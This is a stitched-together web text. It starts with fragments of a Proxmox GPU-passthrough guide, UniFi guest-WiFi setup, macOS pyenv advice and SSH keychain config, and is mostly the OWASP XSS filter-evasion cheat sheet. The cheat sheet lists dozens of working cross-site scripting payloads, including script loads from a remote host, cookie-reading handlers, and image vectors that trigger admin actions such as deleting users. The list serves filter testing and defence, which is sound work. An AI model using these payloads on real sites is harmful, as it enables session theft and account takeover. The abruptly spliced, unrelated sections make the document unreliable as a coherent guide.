Requirements: VT-d Interrupt mapping UEFI BIOS Configuring Proxmox \u00b6 Configuring the Grub Assuming you are using an Intel CPU, either SSH directly into your Proxmox server, or utilizing the noVNC Shell terminal under \"Node\", open up the /etc/default/grub file. I prefer to use nano, but you can use whatever text editor you prefer. nano /etc/default/grub Look for this line: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet\" Then change it to look like this: For Intel CPU GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on\" For AMD CPU GRUB_CMDLINE_LINUX_DEFAULT = \"quiet amd_iommu=on\" IMPORTANT ADDITIONAL COMMANDS You might need to add additional commands to this line, if the passthrough ends up failing. For example, if you're using a similar CPU as I am (Xeon E3-12xx series), which has horrible IOMMU grouping capabilities, and/or you are trying to passthrough a single GPU. These additional commands essentially tell Proxmox not to utilize the GPUs present for itself, as well as helping to split each PCI device into its own IOMMU group. This is important because, if you try to use a GPU in say, IOMMU group 1, and group 1 also has your CPU grouped together for example, then your GPU passthrough will fail. Here are my grub command line settings: GRUB_CMDLINE_LINUX_DEFAULT = \"quiet intel_iommu=on iommu=pt pcie_acs_override=downstream,multifunction nofb nomodeset video=vesafb:off,efifb:off\" For more information on what these commands do and how they help: A.

IOMMU Interrupt Remapping \u00b6 I'm not going to get too much into this; all you really need to do is run the following commands in your Shell: echo \"options vfio_iommu_type1 allow_unsafe_interrupts=1\" > /etc/modprobe.d/iommu_unsafe_interrupts.conf echo \"options kvm ignore_msrs=1\" > /etc/modprobe.d/kvm.conf Blacklisting Drivers \u00b6 We don't want the Proxmox host system utilizing our GPU(s), so we need to blacklist the drivers. Run these commands in your Shell: echo \"blacklist radeon\" >> /etc/modprobe.d/blacklist.conf echo \"blacklist nouveau\" >> /etc/modprobe.d/blacklist.conf echo \"blacklist nvidia\" >> /etc/modprobe.d/blacklist.conf Adding GPU to VFIO \u00b6 Run this command: lspci -v Your shell window should output a bunch of stuff.

It'll look something like this: 01:00.0 VGA compatible controller: NVIDIA Corporation GP104 [GeForce GTX 1070] (rev a1) (prog-if 00 [VGA controller]) 01:00.1 Audio device: NVIDIA Corporation GP104 High Definition Audio Controller (rev a1) Make note of the first set of numbers (e.g. 01:00.0 and 01:00.1 ). We'll need them for the next step. Run the command below. Replace 01:00 with whatever number was next to your GPU when you ran the previous command: lspci -n -s 01 :00 Doing this should output your GPU card's Vendor IDs, usually one ID for the GPU and one ID for the Audio bus. It'll look a little something like this 01:00.0 0000: 10de:1b81 (rev a1) 01:00.1 0000: 10de:10f0 (rev a1) What we want to keep, are these vendor id codes: 10de:1b81 and 10de:10f0 .

Let's continue to set up the Uifi AP Unifi Configuration \u00b6 If you want to limit your Guest Users Bandwidth, head over to User Groups and create a new user group called Guest. Enter bandwidth limits that are appropriate for your Internet Speed. I used 6000 down and 2500 up. Now go to the Wireless Networks section and create a new network called \u201cGuest\u201d or whatever you want to call it. Make sure it is enabled, give it WiFi security key, check the \u201cGuest Policy\u201d option, enter the VLAN Id you used previously and choose the Guest User Group. Save! Done. Test Your New Guest Wifi by connecting to the Guest Wifi and browse to a website.

The reason for that is that MacOS uses Python 2 for its core system with pip as a package manager. When Xcode Command Line Tools are installed Python 3 and pip3 package manager will be available at the cli. When using Python2, Python3 and their package managers this way, all the packages will be installed at the system level and my effect the native packages and their dependences , this can break or lead to unwanted bugs in OS. The right way to use python at MacOS is to use Virtual Environments for python. This way all the system related versions of python and their packages won't be affected and use by you. Installing and configuring pyenv, pyenv-virtualenv \u00b6 In order to use pyenv, pyenv-virtualenv without conflicting with the native MacOS python we need to add some configuration to our ~/.zshrc config (for mac os catalina) or your bash config if you are still using bash. It's very imported to maintain the order of the configuration for the loading order First of all we need to include your Executable Paths. In the example we added all the common paths, including the paths for pyenv, pyenv-virtualenv. If you have any other path that you use, you can add them at the same line or create a new line below this one. Second to Executable Paths we will add two if statements that will check if the pyenv,pyenv-virtualenv are installed, if they are it will load them.

When using Python2, Python3 and their package managers this way, all the packages will be installed at the system level and my effect the native packages and their dependences , this can break or lead to unwanted bugs in OS.

(If you're on a pre-Sierra version of OSX, you're done, Step 2 is not required.) Step 2 - Configure SSH to always use the keychain It seems that OSX Sierra removed the convenient behavior of persisting your keys between logins, and the update to ssh no longer uses the keychain by default. Because of this, you will get prompted to enter the passphrase for a key after you upgrade, and again after each restart. The solution is fairly simple, and is outlined in this github thread comment. Here's how you set it up: Ensure you've completed Step 1 above to store the key in the keychain. If you haven't already, create an ~/.ssh/config file. In other words, in the .ssh directory in your home dir, make a file called config. In that .ssh/config file, add the following lines: Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_rsa Change ~/.ssh/id_rsa to the actual filename of your private key. If you have other private keys in your ~.ssh directory, also add an IdentityFile line for each of them. For example, I have one additional line that reads IdentityFile ~/.ssh/id_ed25519 for a 2 nd private key. The UseKeychain yes is the key part, which tells SSH to look in your OSX keychain for the key passphrase. That's it! Next time you load any ssh connection, it will try the private keys you've specified, and it will look for their passphrase in the OSX keychain. No passphrase typing required.

The initial contents of this article were donated to OWASP by RSnake, from his seminal XSS CheatSheet, which was at: http://ha.ckers.org/xss.html . That site now redirects to its new home here, where we plan to maintain and enhance it. The very first OWASP Prevention CheatSheet, the Cross Site Scripting Prevention CheatSheet , was inspired by RSnake's XSS CheatSheet, so we can thank RSnake for our inspiration. We wanted to create short, simple guidelines that developers could follow to prevent XSS, rather than simply telling developers to build apps that could protect against all the fancy tricks specified in rather complex attack CheatSheet, and so the OWASP CheatSheet Series was born. This CheatSheet lists a series of XSS attacks that can be used to bypass certain XSS defensive filters. Please note that input filtering is an incomplete defense for XSS which these tests can be used to illustrate. Basic XSS Test Without Filter Evasion \u00b6 This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here): < SCRIPT SRC = http://xss.rocks/xss.js ></ SCRIPT > XSS Locator (Polygot) \u00b6 The following is a \"polygot test XSS payload.\" This test will execute in multiple contexts including html, script string, js and url. Thank you to Gareth Heyes for this contribution . `javascript:/*--> </ title ></ style ></ textarea ></ script ></ xmp >< svg / onload = '+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//' > Image XSS Using the JavaScript Directive \u00b6 Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well: < IMG SRC = \"javascript:alert('XSS');\" > No Quotes and no Semicolon \u00b6 < IMG SRC = javascript:alert('XSS') > Case Insensitive XSS Attack Vector \u00b6 < IMG SRC = JaVaScRiPt:alert('XSS') > HTML Entities \u00b6 The semicolons are required for this to work: < IMG SRC = javascript:alert(&quot;XSS&quot;) > Grave Accent Obfuscation \u00b6 If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents: < IMG SRC = `javascript:alert(\"RSnake says , ' XSS '\")` > Malformed A Tags \u00b6 Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross ~ Verified on Chrome `\\ < a onmouseover = \"alert(document.cookie)\" \\ > xxs link\\ < /a\\> or Chrome loves to replace missing quotes for you... if you ever get stuck just leave them off and Chrome will put them in the right place and fix your missing quotes on a URL or script. `\\ < a onmouseover = alert(document.cookie)\\ > xxs link\\ < /a\\> Malformed IMG Tags \u00b6 Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags: < IMG \"\"\" >< SCRIPT > alert ( \"XSS\" )</ SCRIPT > \"\\> fromCharCode \u00b6 If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need: < IMG SRC = javascript:alert(String.fromCharCode(88,83,83)) > Default SRC Tag to Get Past Filters that Check SRC Domain \u00b6 This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like onblur , onclick giving you an extensive amount of variations for many injections listed here. Submitted by David Cross . Edited by Abdullah Hussam( @Abdulahhusam ). < IMG SRC = # onmouseover = \"alert('xxs')\" > Default SRC Tag by Leaving it Empty \u00b6 < IMG SRC = onmouseover=\"alert('xxs')\" > Default SRC Tag by Leaving it out Entirely \u00b6 < IMG onmouseover = \"alert('xxs')\" > On Error Alert \u00b6 < IMG SRC = / onerror = \"alert(String.fromCharCode(88,83,83))\" ></ img > IMG onerror and JavaScript Alert Encode \u00b6 < img src = x onerror = \"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\" > Decimal HTML Character References \u00b6 All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). < IMG SRC = &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41; > Decimal HTML Character References Without Trailing Semicolons \u00b6 This is often effective in XSS that attempts to look for \"&#XX;\", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like \\(tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild): < IMG SRC = &#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041 > Hexadecimal HTML Character References Without Trailing Semicolons \u00b6 This is also a viable XSS attack against the above string \\(tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/\\) 1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). < IMG SRC = &#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29 > Embedded Tab \u00b6 Used to break up the cross site scripting attack: < IMG SRC = \"jav ascript:alert('XSS');\" > Embedded Encoded Tab \u00b6 Use this one to break up XSS : < IMG SRC = \"jav&#x09;ascript:alert('XSS');\" > Embedded Newline to Break-up XSS \u00b6 Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector: < IMG SRC = \"jav&#x0A;ascript:alert('XSS');\" > Embedded Carriage Return to Break-up XSS \u00b6 (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.): < IMG SRC = \"jav&#x0D;ascript:alert('XSS');\" > Null breaks up JavaScript Directive \u00b6 Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim ( ^V^@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example: `perl -e 'print \" < IMG SRC = java\\0script:alert(\\\"XSS\\\") > \";' > out` Spaces and Meta Chars Before the JavaScript in Images for XSS \u00b6 This is useful if the pattern match doesn't take into account spaces in the word javascript: -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the javascript: keyword. The actual reality is you can have any char from 1-32 in decimal: < IMG SRC = \" &#14; javascript:alert('XSS');\" > Non-alpha-non-digit XSS \u00b6 The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example \\<SCRIPT\\\\s != \\<SCRIPT/XSS\\\\s : < SCRIPT / XSS SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT > Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here: < BODY onload !#$%&()*~+ -_ ., : ;?@[/|\\]^`= alert (\" XSS \") > Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces. < SCRIPT / SRC = \"http://xss.rocks/xss.js\" ></ SCRIPT > Extraneous Open Brackets \u00b6 Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error: < < SCRIPT > alert ( \"XSS\" ); //\\< </ SCRIPT > No Closing Script Tags \u00b6 In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the \\></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected: < SCRIPT SRC = http://xss.rocks/xss.js?< B > Protocol Resolution in Script Tags \u00b6 This particular variant was submitted by \u0141ukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag. < SCRIPT SRC = //xss.rocks/.j > Half Open HTML/JavaScript XSS Vector \u00b6 Unlike Firefox the IE rendering engine doesn't add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close \">\" tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/ because it doesn't require the end \">\". As a side note, this was also affective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag: < IMG SRC = \"`<javascript:alert>`('XSS')\" ` Double Open Angle Brackets \u00b6 Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't: < iframe src = http://xss.rocks/scriptlet.html <` Escaping JavaScript Escapes \u00b6 When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.: `\\\";alert('XSS');//` An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own: </ script >< script > alert ( 'XSS' );</ script > End Title Tag \u00b6 This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack: </ TITLE >< SCRIPT > alert ( \"XSS\" );</ SCRIPT > INPUT Image \u00b6 < INPUT TYPE = \"IMAGE\" SRC = \"javascript:alert('XSS');\" > BODY Image \u00b6 < BODY BACKGROUND = \"javascript:alert('XSS')\" > IMG Dynsrc \u00b6 < IMG DYNSRC = \"javascript:alert('XSS')\" > IMG Lowsrc \u00b6 < IMG LOWSRC = \"javascript:alert('XSS')\" > List-style-image \u00b6 Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector: < STYLE > li { list-style-image : url ( \"javascript:alert('XSS')\" );}</ STYLE >< UL >< LI > XSS </ br > VBscript in an Image \u00b6 < IMG SRC = 'vbscript:msgbox(\"XSS\")' > Livescript (older versions of Netscape only) \u00b6 < IMG SRC = \"livescript:[code]\" > SVG Object Tag \u00b6 < svg / onload = alert('XSS') > ECMAScript 6 \u00b6 Set.constructor`alert\\x28document.domain\\x29 BODY Tag \u00b6 Method doesn't require using any variants of javascript: or <SCRIPT... to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign ( onload= != onload = ): < BODY ONLOAD = alert('XSS') > Event Handlers \u00b6 It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing).

BGSOUND \u00b6 < BGSOUND SRC = \"javascript:alert('XSS');\" > & JavaScript includes \u00b6 < BR SIZE = \"&{alert('XSS')}\" > STYLE sheet \u00b6 < LINK REL = \"stylesheet\" HREF = \"javascript:alert('XSS');\" > Remote style sheet \u00b6 Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page: < LINK REL = \"stylesheet\" HREF = \"http://xss.rocks/xss.css\" > Remote style sheet part 2 \u00b6 This works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world: < STYLE >@ import 'http://xss.rocks/xss.css' ;</ STYLE > Remote style sheet part 3 \u00b6 This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://xss.rocks/xss.css>; REL=stylesheet ) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox: < META HTTP-EQUIV = \"Link\" Content = \"<http://xss.rocks/xss.css>; REL=stylesheet\" > Remote style sheet part 4 \u00b6 This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites: < STYLE > BODY { -moz- binding : url ( \"http://xss.rocks/xssmoz.xml#xss\" )}</ STYLE > STYLE Tags with Broken-up JavaScript for XSS \u00b6 This XSS at times sends IE into an infinite loop of alerts: < STYLE >@ im \\ port '\\ja\\vasc\\ript:alert(\"XSS\")' ;</ STYLE > STYLE Attribute using a Comment to Break-up Expression \u00b6 Created by Roman Ivanov < IMG STYLE = \"xss:expr/*XSS*/ession(alert('XSS'))\" > IMG STYLE with Expression \u00b6 This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop: exp/* < A STYLE = 'no\\xss:noxss(\"*//*\"); xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))' > STYLE Tag (Older versions of Netscape only) \u00b6 < STYLE TYPE = \"text/javascript\" > alert ( 'XSS' ); </ STYLE > STYLE Tag using Background-image \u00b6 < STYLE >. XSS { background-image : url ( \"javascript:alert('XSS')\" );}</ STYLE >< A CLASS = XSS ></ A > STYLE Tag using Background \u00b6 < STYLE type = \"text/css\" > BODY { background : url ( \"javascript:alert('XSS')\" )}</ STYLE > ` ` < STYLE type = \"text/css\" > BODY { background : url ( \"<javascript:alert>('XSS')\" )}</ STYLE > Anonymous HTML with STYLE Attribute \u00b6 IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter: < XSS STYLE = \"xss:expression(alert('XSS'))\" > Local htc File \u00b6 This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute: < XSS STYLE = \"behavior: url(xss.htc);\" > US-ASCII Encoding \u00b6 US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding. `\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be` META \u00b6 The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs: < META HTTP-EQUIV = \"refresh\" CONTENT = \"0;url=javascript:alert('XSS');\" > META using Data \u00b6 Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS calculator below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method: < META HTTP-EQUIV = \"refresh\" CONTENT = \"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\" > META with Additional URL Parameter \u00b6 If the target website attempts to see if the URL contains <http://>; at the beginning you can evade it with the following technique (Submitted by Moritz Naumann): < META HTTP-EQUIV = \"refresh\" CONTENT = \"0; URL=http://;URL=javascript:alert('XSS');\" > IFRAME \u00b6 If iframes are allowed there are a lot of other XSS problems as well: < IFRAME SRC = \"javascript:alert('XSS');\" ></ IFRAME > IFRAME Event Based \u00b6 IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross) < IFRAME SRC = # onmouseover = \"alert(document.cookie)\" ></ IFRAME > FRAME \u00b6 Frames have the same sorts of XSS problems as iframes < FRAMESET >< FRAME SRC = \"javascript:alert('XSS');\" ></ FRAMESET > TABLE \u00b6 < TABLE BACKGROUND = \"javascript:alert('XSS')\" > TD \u00b6 Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors: < TABLE >< TD BACKGROUND = \"javascript:alert('XSS')\" > DIV \u00b6 DIV Background-image \u00b6 < DIV STYLE = \"background-image: url(javascript:alert('XSS'))\" > DIV Background-image with Unicoded XSS Exploit \u00b6 This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail: < DIV STYLE = \"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\" > DIV Background-image Plus Extra Characters \u00b6 Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279): < DIV STYLE = \"background-image: url(javascript:alert('XSS'))\" > DIV Expression \u00b6 A variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\": < DIV STYLE = \"width: expression(alert('XSS'));\" > Downlevel-Hidden Block \u00b6 Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job: <!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]--> BASE Tag \u00b6 Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg you can remove one slash from this vector (as long as there are two to begin the comment this will work): < BASE HREF = \"javascript:alert('XSS');//\" > OBJECT Tag \u00b6 If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS: < OBJECT TYPE = \"text/x-scriptlet\" DATA = \"http://xss.rocks/scriptlet.html\" ></ OBJECT > EMBED a Flash Movie That Contains XSS \u00b6 Click here for a demo: http://ha.ckers.org/xss.swf < EMBED SRC = \"http://ha.ckers.org/xss.swf\" AllowScriptAccess = \"always\" ></ EMBED > If you add the attributes allowScriptAccess=\"never\" and allownetworking=\"internal\" it can mitigate this risk (thank you to Jonathan Vanasco for the info). EMBED SVG Which Contains XSS Vector \u00b6 This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one. < EMBED SRC = \"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type = \"image/svg+xml\" AllowScriptAccess = \"always\" ></ EMBED > Using ActionScript Inside Flash for Obfuscation \u00b6 a = \"get\" ; b = \"URL(\\\"\" ; c = \"javascript:\" ; d = \"alert('XSS');\\\")\" ; eval ( a + b + c + d ); XML Data Island with CDATA Obfuscation \u00b6 This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo: <XML ID= \"xss\" ><I><B><IMG SRC= \"javas<!-- -->cript:alert('XSS')\" ></B></I></XML> <SPAN DATASRC= \"#xss\" DATAFLD= \"B\" DATAFORMATAS= \"HTML\" ></SPAN> Locally hosted XML with embedded JavaScript that is generated using an XML data island \u00b6 This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here: <XML SRC= \"xsstest.xml\" ID= I ></XML> <SPAN DATASRC= #I DATAFLD= C DATAFORMATAS= HTML ></SPAN> HTML+TIME in XML \u00b6 This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work: < HTML >< BODY > < ?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> < ?import namespace=\"t\" implementation=\"#default#time2\"> < t:set attributeName = \"innerHTML\" to = \"XSS<SCRIPT DEFER>alert(\" XSS \")</ SCRIPT > \"> </ BODY ></ HTML > Assuming you can only fit in a few characters and it filters against .js \u00b6 You can rename your JavaScript file to an image as an XSS vector: < SCRIPT SRC = \"http://xss.rocks/xss.jpg\" ></ SCRIPT > SSI (Server Side Includes) \u00b6 This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues: <!-- # exec cmd = \"/bin/echo '<SCR'\" --> <!-- # exec cmd = \"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\" --> PHP \u00b6 Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues: <? echo ( '<SCR)' ; echo ( 'IPT>alert(\"XSS\")</SCRIPT>' ); ?> IMG Embedded Commands \u00b6 This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors: < IMG SRC = \"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\" > IMG Embedded Commands part II \u00b6 This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=\"httx://badguy.com/a.jpg\"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this): Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser Cookie Manipulation \u00b6 Admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...): < META HTTP-EQUIV = \"Set-Cookie\" Content = \"USERID=<SCRIPT>alert('XSS')</SCRIPT>\" > UTF-7 Encoding \u00b6 If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.: < HEAD >< META HTTP-EQUIV = \"CONTENT-TYPE\" CONTENT = \"text/html; charset=UTF-7\" > </ HEAD > +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-` XSS Using HTML Quote Encapsulation \u00b6 This was tested in IE, your mileage may vary.

